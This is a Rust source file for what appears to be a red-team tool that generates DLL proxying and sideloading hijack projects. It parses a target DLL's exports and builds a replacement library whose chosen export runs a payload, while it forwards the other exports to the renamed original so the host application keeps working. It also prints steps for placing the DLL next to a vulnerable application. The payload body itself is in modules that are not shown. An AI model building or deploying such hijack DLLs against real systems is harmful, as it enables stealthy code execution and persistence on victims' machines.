mod proxy;
mod sideload;

use getopts::Options;
use std::{
    env, fs,
    io::{self, Read},
    path::Path,
};

const CARGO_TOML_TEMPLATE: &str = r#"
[package]
name = "{PROJECT_NAME}"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
lazy_static = "1.4.0"
dyncvoke = { git = "https://github.com/Whitecat18/Dyncvoke" }

[dependencies.windows-sys]
version = "0.61.2"
features = [
    "Win32_Foundation",
    "Win32_Security",
    "Win32_System_Threading",
    "Win32_UI_WindowsAndMessaging",
    "Win32_System_Memory",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_SystemServices",
    "Win32_System_LibraryLoader",
    "Win32_UI_Shell",
]

[build-dependencies]
windres = "0.2.2"
"#;

fn main() {
    let args: Vec<String> = env::args().collect();
    let program = args[0].clone();

    let mut opts = Options::new();
    opts.reqopt("m", "mode", "Mode: 'proxy' or 'sideload'", "MODE");
    opts.reqopt("p", "path", "Path to target DLL", "PATH");
    opts.reqopt("e", "export", "Export to hijack", "EXPORT");
    opts.optopt("n", "name", "Original DLL name (renamed)", "ORIG_NAME");

    let matches = match opts.parse(&args[1..]) {
        Ok(m) => m,
        Err(f) => {
            println!("[!] Error: {}", f);
            print_usage(&program, opts);
            return;
        }
    };

    let mode = matches.opt_str("m").unwrap();
    let dll_path_str = matches.opt_str("p").unwrap();
    let hijack_export = matches.opt_str("e").unwrap();

    let dll_path = Path::new(&dll_path_str);
    let dll_stem = dll_path.file_stem().unwrap().to_str().unwrap();

    let default_orig_name = format!("{}_orig.dll", dll_stem);
    let original_dll_full_name = matches.opt_str("n").unwrap_or(default_orig_name);

    if !dll_path.exists() {
        println!("[!] Error: DLL file not found at: {}", dll_path.display());
        return;
    }

    let exports = parse_pe_exports(dll_path).unwrap_or(vec![]);
    let project_name = dll_stem.replace(".", "_");
    let root_dir = Path::new(&project_name);

    // Delete existing project directory if it exists
    if root_dir.exists() {
        println!(
            "[*] Removing existing project directory: {}",
            root_dir.display()
        );
        let _ = fs::remove_dir_all(root_dir); // Continue even if deletion fails
    }

    // Create directory structure
    fs::create_dir_all(root_dir.join("src")).unwrap();

    let is_proxy = mode == "proxy";

    if is_proxy {
        // Generate Cargo.toml (proxy version with dyncvoke from git)
        fs::write(
            root_dir.join("Cargo.toml"),
            CARGO_TOML_TEMPLATE.replace("{PROJECT_NAME}", &project_name),
        )
        .unwrap();

        // Generate match statement - ONLY the hijacked function with index 0
        let match_arms = format!("        0 => \"{}\".to_string(),", hijack_export);

        let export_count = exports.len();

        // Generate forward functions for ALL exports (except hijacked) as stubs
        let mut forward_functions = String::new();
        for (name, _ordinal) in exports.iter() {
            if name != &hijack_export {
                forward_functions.push_str(&format!(
                    "#[no_mangle]\npub unsafe extern \"system\" fn {}() {{}}\n",
                    name
                ));
            }
        }

        // Generate the hijacked function - always uses export_id 0
        let hijack_function = format!(
            r#"#[no_mangle]
pub unsafe extern "system" fn {}(
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
    a7: u64,
    a8: u64,
    a9: u64,
    a10: u64,
    a11: u64,
    a12: u64,
    a13: u64,
    a14: u64,
    a15: u64,
    a16: u64,
    a17: u64,
    a18: u64,
    a19: u64,
    a20: u64,
) -> u64 {{
    dispatch_call(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, 0)
}}"#,
            hijack_export
        );

        // Determine DLL path: if -p has absolute path, use that; else use renamed DLL name
        let original_dll_path = if dll_path.is_absolute() {
            // Absolute path - use it directly
            dll_path_str.replace("\\", "\\\\")
        } else {
            // Relative path - use just the renamed DLL name (user will put it in same directory)
            original_dll_full_name.clone()
        };

        // Build the lib.rs content
        let lib_content = proxy::LIB_RS_TEMPLATE
            .replace("{ORIGINAL_DLL_PATH}", &original_dll_path)
            .replace("{NUM_EXPORTS}", &export_count.to_string())
            .replace("{MATCH_STATEMENT}", &match_arms)
            .replace("{HIJACK_FUNCTION}", &hijack_function);

        fs::write(root_dir.join("src/lib.rs"), lib_content).unwrap();

        // Generate forward.rs with stub functions (needed by linker for .def exports)
        fs::write(root_dir.join("src/forward.rs"), forward_functions).unwrap();

        // Generate proxy.def with proper forwarding
        let mut def_content = format!("LIBRARY {}\nEXPORTS\n", dll_stem);
        let forward_target = if dll_path.is_absolute() {
            // Absolute path mode: forward to full path (e.g., C:\Windows\System32\TextShaping)
            let p = Path::new(&dll_path_str);
            p.with_extension("").to_string_lossy().to_string()
        } else {
            // Relative path mode: forward to renamed DLL stem (e.g., Shaping)
            Path::new(&original_dll_full_name)
                .file_stem()
                .unwrap()
                .to_str()
                .unwrap()
                .to_string()
        };

        for (name, ordinal) in &exports {
            if name == &hijack_export {
                // Hijacked export - no forwarding, handled by dispatch_call in lib.rs
                def_content.push_str(&format!("{} @{}\n", name, ordinal));
            } else {
                // Forward to original DLL
                def_content.push_str(&format!(
                    "{}={}.{} @{}\n",
                    name, forward_target, name, ordinal
                ));
            }
        }

        fs::write(root_dir.join("build.rs"), proxy::BUILD_RS_TEMPLATE).unwrap();
        fs::write(root_dir.join("proxy.def"), def_content).unwrap();

        // Print appropriate warning based on path type
        if dll_path.is_absolute() {
            print_proxy_warning_absolute(dll_stem, &dll_path_str, &hijack_export);
        } else {
            print_proxy_warning(dll_stem, &original_dll_full_name, &hijack_export);
        }
    } else {
        // Sideload mode - simple DLL with hijacked export, no proxying needed

        // Generate Cargo.toml (sideload version, no dyncvoke)
        fs::write(
            root_dir.join("Cargo.toml"),
            sideload::CARGO_TOML_TEMPLATE.replace("{PROJECT_NAME}", &project_name),
        )
        .unwrap();

        // Generate the hijacked function for sideload
        let hijack_function = format!(
            r#"#[no_mangle]
pub unsafe extern "system" fn {}(
    _a1: u64, 
    _a2: u64, 
    _a3: u64, 
    _a4: u64, 
    _a5: u64, 
    _a6: u64, 
    _a7: u64, 
    _a8: u64,
    _a9: u64, 
    _a10: u64, 
    _a11: u64, 
    _a12: u64, 
    _a13: u64, 
    _a14: u64, 
    _a15: u64,
    _a16: u64, 
    _a17: u64, 
    _a18: u64, 
    _a19: u64, 
    _a20: u64
) -> u64 {{
    payload_execution();
    1
}}"#,
    hijack_export
        );

        // Generate lib.rs
        let lib_content = sideload::LIB_RS_TEMPLATE.replace("{HIJACK_FUNCTION}", &hijack_function);
        fs::write(root_dir.join("src/lib.rs"), lib_content).unwrap();

        // Generate forward.rs with stub functions for ALL exports (except hijacked)
        let mut forward_content = String::new();
        for (name, _ordinal) in &exports {
            if name != &hijack_export {
                forward_content.push_str(&format!(
                    "#[no_mangle]\npub unsafe extern \"system\" fn {}() {{}}\n\n",
                    name
                ));
            }
        }
        fs::write(root_dir.join("src/forward.rs"), forward_content).unwrap();

        print_sideload_warning(dll_stem, &hijack_export);
    }

    println!("[+] Project generated: ./{}", project_name);
}

fn print_proxy_warning(dll_stem: &str, orig_name: &str, export: &str) {
    println!(
        "\n\x1b[31m\x1b[1m======================================================================\x1b[0m"
    );
    println!("\x1b[31m\x1b[1m[!] PROXY MODE CONFIGURATION\x1b[0m");
    println!(
        "\x1b[31m\x1b[1m======================================================================\x1b[0m"
    );
    println!(
        "    1. Rename original '{}.dll' -> '{}'",
        dll_stem, orig_name
    );
    println!(
        "    2. Place generated DLL + '{}' in same folder.",
        orig_name
    );
    println!("    3. Payload triggers on: '{}'", export);
    println!(
        "\x1b[31m\x1b[1m======================================================================\x1b[0m\n"
    );
}

fn print_proxy_warning_absolute(_dll_stem: &str, original_path: &str, export: &str) {
    println!(
        "\n\x1b[31m\x1b[1m======================================================================\x1b[0m"
    );
    println!("\x1b[31m\x1b[1m[!] PROXY MODE CONFIGURATION (Full Path Mode)\x1b[0m");
    println!(
        "\x1b[31m\x1b[1m======================================================================\x1b[0m"
    );
    println!("    1. DLL will be loaded from: '{}'", original_path);
    println!("    2. No file renaming needed - uses absolute path.");
    println!("    3. Payload triggers on: '{}'", export);
    println!(
        "\x1b[31m\x1b[1m======================================================================\x1b[0m\n"
    );
}

fn print_sideload_warning(dll_stem: &str, export: &str) {
    println!(
        "\n\x1b[33m\x1b[1m======================================================================\x1b[0m"
    );
    println!("\x1b[33m\x1b[1m[!] SIDELOAD MODE CONFIGURATION\x1b[0m");
    println!(
        "\x1b[33m\x1b[1m======================================================================\x1b[0m"
    );
    println!(
        "    1. Place generated '{}.dll' alongside the vulnerable application.",
        dll_stem
    );
    println!(
        "    2. Application loads '{}.dll' and calls '{}'.",
        dll_stem, export
    );
    println!("    3. Payload triggers on: '{}'", export);
    println!(
        "\x1b[33m\x1b[1m======================================================================\x1b[0m\n"
    );
}

fn print_usage(program: &str, opts: Options) {
    let brief = format!("Usage: {} [options]", program);
    print!("{}", opts.usage(&brief));
}

fn parse_pe_exports(path: &Path) -> io::Result<Vec<(String, u32)>> {
    let mut file = fs::File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    let base = buffer.as_ptr();
    let len = buffer.len();

    let get_u32 = |offset: usize| -> u32 {
        if offset + 4 > len {
            0
        } else {
            unsafe { *((base.add(offset)) as *const u32) }
        }
    };
    let get_u16 = |offset: usize| -> u16 {
        if offset + 2 > len {
            0
        } else {
            unsafe { *((base.add(offset)) as *const u16) }
        }
    };

    if get_u16(0) != 0x5A4D {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "Invalid DOS"));
    }
    let e_lfanew = get_u32(0x3C) as usize;
    if get_u32(e_lfanew) != 0x00004550 {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "Invalid PE"));
    }

    let optional_header_offset = e_lfanew + 24;
    let (rva_count_offset, data_dirs_offset) = match get_u16(optional_header_offset) {
        0x10B => (optional_header_offset + 92, optional_header_offset + 96),
        0x20B => (optional_header_offset + 108, optional_header_offset + 112),
        _ => return Err(io::Error::new(io::ErrorKind::InvalidData, "Unknown Magic")),
    };

    if get_u32(rva_count_offset) == 0 {
        return Ok(Vec::new());
    }
    let export_rva = get_u32(data_dirs_offset);
    if export_rva == 0 {
        return Ok(Vec::new());
    }

    let file_header_offset = e_lfanew + 4;
    let number_of_sections = get_u16(file_header_offset + 2);
    let size_of_optional_header = get_u16(file_header_offset + 16);
    let section_headers_offset = optional_header_offset + size_of_optional_header as usize;

    let rva_to_offset = |rva: u32| -> usize {
        for i in 0..number_of_sections as usize {
            let entry_offset = section_headers_offset + (i * 40);
            let virtual_address = get_u32(entry_offset + 12);
            let size_of_raw_data = get_u32(entry_offset + 16);
            if rva >= virtual_address && rva < virtual_address + size_of_raw_data {
                return (rva - virtual_address + get_u32(entry_offset + 20)) as usize;
            }
        }
        0
    };

    let export_file_offset = rva_to_offset(export_rva);
    if export_file_offset == 0 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "Invalid Export RVA",
        ));
    }

    let ordinal_base = get_u32(export_file_offset + 16);
    let number_of_names = get_u32(export_file_offset + 24);
    let address_of_names = get_u32(export_file_offset + 32);
    let address_of_name_ordinals = get_u32(export_file_offset + 36);

    let names_offset = rva_to_offset(address_of_names);
    let ordinals_offset = rva_to_offset(address_of_name_ordinals);
    if names_offset == 0 || ordinals_offset == 0 {
        return Ok(Vec::new());
    }

    let mut exports = Vec::new();
    for i in 0..number_of_names {
        let name_rva = get_u32(names_offset + (i as usize * 4));
        let name_offset = rva_to_offset(name_rva);
        let ordinal_index = get_u16(ordinals_offset + (i as usize * 2));
        if name_offset != 0 {
            let mut name_str = String::new();
            let mut cur = name_offset;
            while cur < len && unsafe { *base.add(cur) } != 0 {
                name_str.push(unsafe { *base.add(cur) } as char);
                cur += 1;
            }
            exports.push((name_str, ordinal_base + ordinal_index as u32));
        }
    }
    Ok(exports)
}
